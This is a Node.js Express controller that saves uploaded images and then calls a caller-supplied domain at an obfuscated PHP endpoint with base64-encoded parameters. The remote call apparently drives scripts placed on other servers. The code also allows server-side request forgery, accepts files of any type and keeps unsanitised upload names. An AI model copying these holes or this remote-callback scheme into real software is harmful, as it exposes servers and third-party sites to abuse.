const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const axios = require("axios");

// Configure multer for image uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = "uploads/images";
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname.replace(/\s+/g, "_")}`);
  },
});

const upload = multer({ storage });

// @desc    Upload image and notify remote server
// @route   POST /api/images/upload
// @access  Private
const uploadImage = async (req, res) => {
  const { domain, pattern } = req.body;
  const file = req.file;

  if (!file || !domain || !pattern) {
    return res
      .status(400)
      .json({ message: "File, domain, and pattern are required" });
  }

  try {
    const imageLink = `${domain}${pattern}${file.filename}`;

    // Legacy parity: notify remote server if needed (as seen in upload_action.php)
    // The target server has aiwmaooduwiswmmairuploadfiew.php which connects back
    // to base domain to fetch the image. The target expects base64 encoded strings.
    try {
      const remoteUrl = `${domain}/aiwmaooduwiswmmairuploadfiew`;
      await axios.get(remoteUrl, {
        params: {
          domain: Buffer.from(domain).toString("base64"),
          pattern: Buffer.from(pattern).toString("base64"),
          img: Buffer.from(file.filename).toString("base64"),
        },
        timeout: 5000, // Timeout so we don't hold the request forever if target is offline
      });
      console.log(
        `[ImageUpload] Notified remote server successfully: ${domain}`,
      );
    } catch (e) {
      console.error(
        `[ImageUpload] Failed to notify remote server ${domain}:`,
        e.message,
      );
      // Proceed with a clean 200 response anyway since the local save succeeded.
    }

    res.status(200).json({
      message: "Image uploaded successfully",
      imageLink,
      filename: file.filename,
    });
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error processing image upload", error: error.message });
  }
};

module.exports = { uploadImage, uploadMiddleware: upload.single("image") };
